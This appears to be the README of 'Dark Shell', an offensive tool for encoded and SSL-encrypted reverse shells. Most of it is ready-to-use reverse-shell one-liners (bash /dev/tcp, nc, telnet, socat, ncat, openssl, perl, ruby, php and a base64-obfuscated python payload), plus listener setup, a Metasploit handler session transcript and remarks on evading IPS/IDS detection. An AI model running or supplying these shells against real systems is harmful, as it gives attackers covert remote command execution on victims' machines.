# Dark Shell



## HEX 

Server

```
ruby dark_shell.rb 127.0.0.1 4444 hex
```



Client

```
# exec
0<&137-;exec 137<>/dev/tcp/127.0.0.1/4444;cat <&137 |while read ff; do echo $ff|xxd -r -p|sh |xxd -p >&137 2>&137;done

# nc
mknod backpipe p;tail -f backpipe |nc 127.0.0.1 4444 | while read ff; do echo $ff|xxd -r -p|bash|xxd -p &> backpipe; done

# telnet
tail -f backpipe |telnet 127.0.0.1 4444 | while read ff; do echo $ff|xxd -r -p|bash|xxd -r -p &> backpipe; done
```







## Base64 

Server

```
ruby dark_shell.rb 0.0.0.0 4444 base64
```



Client

```
# exec
0<&137-;exec 137<>/dev/tcp/172.0.0.1/4444;cat <&137 |while read ff; do echo $ff|base64 -d|sh |base64 >&137 2>&137;done

# nc
mknod backpipe p;tail -f backpipe |nc 127.0.0.1 4444 -v | while read ff; do echo $ff|base64 -d|bash|base64 &> backpipe; done

# telnet
tail -f backpipe |telnet 127.0.0.1 4444 | while read ff; do echo $ff|base64 -d|bash|base64 &> backpipe; done

```



## SSL 

### SSL Server

Fortunately, we have some linux commands to start a SSL server.

```
# Generate cert
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes

# openssl
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444

# ncat
ncat -lvnp 4444 --ssl --ssl-cert=cert.pem --ssl-key=key.pem

# socat generate cert
openssl req -new -x509 -keyout test.key -out test.crt -nodes
cat test.key test.crt > test.pem

# socat 
socat openssl-listen:4444,reuseaddr,cert=test.pem,verify=0,fork stdio
```

Of course, dark shell should be here:

```
ruby dark_shell.rb 0.0.0.0 4444 ssl
```



### SSL client

```
# openssl
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.16.1.174:1337 > /tmp/s; rm /tmp/s

# ncat
ncat --ssl 127.0.0.1 4444 -e /bin/bash

# socat
socat exec:'bash' openssl-connect:127.0.0.1:4444,verify=0

socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:127.0.0.1:4444,verify=0

# perl 
perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>"127.0.0.1:2332",SSL_verify_mode=>0);while(sysread($c,$i,8192)){syswrite($c,`$i`);}'

# ruby 
ruby -rsocket -ropenssl -e 'c=OpenSSL::SSL::SSLSocket.new(TCPSocket.new("127.0.0.1","1234")).connect;while(cmd=c.gets);puts(cmd);IO.popen(cmd.to_s,"r"){|io|c.print io.read}end'

# php 
php -r '$ctxt=stream_context_create(["ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);while($s=@stream_socket_client("ssl://127.0.0.1:4444",$erno,$erstr,30,STREAM_CLIENT_CONNECT,$ctxt)){while($l=fgets($s)){exec($l,$o);$o=implode("\n",$o);$o.="\n";fputs($s,$o);}}'&

# python
python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zLHNzbApzbz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKc28uY29ubmVjdCgoJzEyNy4wLjAuMScsNDQ0NCkpCnM9c3NsLndyYXBfc29ja2V0KHNvKQp5bj1GYWxzZQp3aGlsZSBub3QgeW46CglkYXRhPXMucmVjdigxMDI0KQoJaWYgbGVuKGRhdGEpPT0wOgoJCXluID0gVHJ1ZQoJcHJvYz1zdWJwcm9jZXNzLlBvcGVuKGRhdGEsc2hlbGw9VHJ1ZSxzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUsc3RkaW49c3VicHJvY2Vzcy5QSVBFKQoJc3Rkb3V0X3ZhbHVlPXByb2Muc3Rkb3V0LnJlYWQoKSArIHByb2Muc3RkZXJyLnJlYWQoKQoJcy5zZW5kKHN0ZG91dF92YWx1ZSkK'.decode('base64'))" >/dev/null 2>&1
```





## builetin shell

### sbd 
usage like nc
```
client:
sbd 127.0.0.1 4444 -e /bin/bash

server:
sbd -lvp 4444
```

## Metasploit ssl shell

There are some payloads to encrypt our shell:
```
reverse_perl_ssl
reverse_php_ssl
reverse_python_ssl
reverse_ruby_ssl
reverse_openssl
```

### Start handler

```
msf5 exploit(multi/handler) > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload cmd/unix/reverse_perl_ssl
payload => cmd/unix/reverse_perl_ssl
msf5 exploit(multi/handler) > set verbose true
verbose => true
msf5 exploit(multi/handler) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf5 exploit(multi/handler) > set lport 2332
lport => 2332
msf5 exploit(multi/handler) > set exitonsession false
msf5 exploit(multi/handler) > exploit -j

[+] perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>"127.0.0.1:2332",SSL_verify_mode=>0);while(sysread($c,$i,8192)){syswrite($c,`$i`);}'
[*] Exploit running as background job 6.
[*] Exploit completed, but no session was created.

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse SSL handler on 127.0.0.1:2332
```

### Run command

Run perl command above, we got a shell.
```
perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(PeerAddr=>"127.0.0.1:2332",SSL_verify_mode=>0);while(sysread($c,$i,8192)){syswrite($c,`$i`);}'
```

```
msf5 exploit(multi/handler) > [*] Command shell session 9 opened (127.0.0.1:2332 -> 127.0.0.1:57822) at 2019-10-13 17:29:21 +0800
msf5 exploit(multi/handler) > sessions -i 9
[*] Starting interaction with 9...

id
uid=501(green) gid=20(staff) groups=20(staff),501(access_bpf),12(everyone),61(localaccounts),79(_appserverusr),80(admin),81(_appserveradm),98(_lpadmin),701(com.apple.sharepoint.group.1),33(_appstore),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
^C
Abort session 9? [y/N]  y
""

[*] 127.0.0.1 - Command shell session 9 closed.  Reason: User exit
msf5 exploit(multi/handler) >
```

### Notice
1. The network traffic of default setting could be detected easily.  

SSL certificates chain is 
```
s:/C=US/ST=TX/O=Kris, Brekke and King/OU=interface/CN=kris.brekke.king.net/emailAddress=interface@kris.brekke.king.net
i:/C=US/ST=TX/O=Kris, Brekke and King/OU=interface/CN=kris.brekke.king.net/emailAddress=interface@kris.brekke.king.net
```
And the server certificate would not vary too, that leads to lower evasion to IPS/IDS or other detection. 

(The certificate would not be pasted here, you can capture it yourself or try `openssl s_client  -connect <ip:port> -debug` to show.)


2. The reverse ssl shell may not work on your Metasploit.

Since there are some bugs, I have tried to fix it, see:
https://github.com/rapid7/metasploit-framework/pull/12448

Please update your msf if you encounter same problems, any other bugs are welcome to reported.

3. These shell are not best choise.

These shells are based on builetin commands, used in some strict machine or environment. They are not good, stable and compatible as others.
So use them as a temporary shell!

 





